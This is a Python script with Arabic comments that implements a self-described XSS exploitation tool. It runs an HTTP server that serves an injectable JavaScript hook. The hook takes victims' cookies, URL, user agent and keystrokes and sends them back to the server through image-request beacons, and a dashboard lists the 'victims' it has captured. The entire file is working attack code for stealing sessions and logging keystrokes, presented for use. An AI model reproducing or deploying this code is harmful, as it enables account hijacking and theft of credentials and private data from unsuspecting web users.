#!/usr/bin/env python3
from http.server import HTTPServer, BaseHTTPRequestHandler
import json
import urllib.parse
from datetime import datetime
import threading

class XSSHookHandler(BaseHTTPRequestHandler):
    victims = []
    
    def do_GET(self):
        if self.path == '/hook.js':
            # إرجاع الـ hook script
            self.send_response(200)
            self.send_header('Content-Type', 'application/javascript')
            self.end_headers()
            
            hook_script = """
            // XSS Hook - Captured Data
            (function(){
                var data = {
                    url: window.location.href,
                    cookie: document.cookie,
                    userAgent: navigator.userAgent,
                    referrer: document.referrer,
                    timestamp: new Date().toISOString(),
                    domain: document.domain,
                    platform: navigator.platform
                };
                
                // إرسال البيانات للسيرفر
                var img = new Image();
                img.src = 'http://%s:8000/log?data=' + encodeURIComponent(JSON.stringify(data));
                
                // تسجيل keystrokes
                document.onkeypress = function(e) {
                    var keyImg = new Image();
                    keyImg.src = 'http://%s:8000/keys?key=' + e.key;
                };
            })();
            """ % (self.server.server_ip, self.server.server_ip)
            
            self.wfile.write(hook_script.encode())
            
        elif self.path.startswith('/log'):
            # تسجيل البيانات المسروقة
            query = urllib.parse.urlparse(self.path).query
            params = urllib.parse.parse_qs(query)
            
            if 'data' in params:
                victim_data = json.loads(params['data'][0])
                victim_data['ip'] = self.client_address[0]
                victim_data['time'] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                
                self.victims.append(victim_data)
                print(f"[+] Victim Hooked! - {victim_data['ip']}")
                print(f"    URL: {victim_data['url']}")
                print(f"    Cookies: {victim_data['cookie']}")
                print(f"    User Agent: {victim_data['userAgent']}")
                print("    " + "="*50)
            
            self.send_response(200)
            self.end_headers()
            
        elif self.path == '/dashboard':
            # واجهة لعرض الضحايا
            self.send_response(200)
            self.send_header('Content-Type', 'text/html')
            self.end_headers()
            
            html = """
            <html>
            <head><title>XSS Exploitation Tool</title></head>
            <body>
                <h1>XSS Victims Dashboard</h1>
                <div id="victims">%s</div>
                <script>setTimeout(()=>location.reload(), 5000);</script>
            </body>
            </html>
            """ % self.generate_victims_html()
            
            self.wfile.write(html.encode())
            
        else:
            self.send_response(404)
            self.end_headers()
    
    def generate_victims_html(self):
        if not self.victims:
            return "<p>No victims yet...</p>"
        
        html = "<table border='1'><tr><th>Time</th><th>IP</th><th>URL</th><th>Cookies</th></tr>"
        for victim in self.victims[-10:]:  # آخر 10 ضحايا
            html += f"""
            <tr>
                <td>{victim['time']}</td>
                <td>{victim['ip']}</td>
                <td>{victim['url'][:50]}...</td>
                <td>{victim['cookie'][:30]}...</td>
            </tr>
            """
        html += "</table>"
        return html
    
    def log_message(self, format, *args):
        # تعطيل logging الافتراضي
        pass

class XSSHookServer(HTTPServer):
    def __init__(self, server_ip, port=8000):
        self.server_ip = server_ip
        super().__init__(('0.0.0.0', port), XSSHookHandler)

def start_server(ip='localhost', port=8000):
    server = XSSHookServer(ip, port)
    print(f"[+] XSS Hook Server started on http://{ip}:{port}")
    print(f"[+] Hook URL: http://{ip}:{port}/hook.js")
    print(f"[+] Dashboard: http://{ip}:{port}/dashboard")
    print("[+] Waiting for victims...")
    
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[!] Server stopped")

if __name__ == "__main__":
    import socket
    # الحصول على الـ IP تلقائياً
    hostname = socket.gethostname()
    local_ip = socket.gethostbyname(hostname)
    
    print("[*] Starting XSS Exploitation Tool...")
    print(f"[*] Local IP: {local_ip}")
    
    start_server(local_ip)